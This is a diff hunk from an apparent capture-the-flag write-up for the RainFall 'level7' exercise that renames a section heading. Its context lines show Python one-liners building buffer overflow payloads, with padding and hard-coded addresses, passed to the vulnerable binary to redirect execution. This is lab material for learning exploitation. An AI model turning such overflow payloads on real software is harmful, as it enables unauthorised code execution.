@@ -187,7 +187,7 @@ python -c "print 'a' * 20 + '\x28\x99\x04\x08'" python -c "print '\xf4\x84\x04\x
 - `print` 			: outputs data to standard output.
 
 
-## 4. Get The Flag
+## 4. Capture The Flag
 
 ```bash
 level7@RainFall:~$ ./level7 $(python -c "print 'a' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
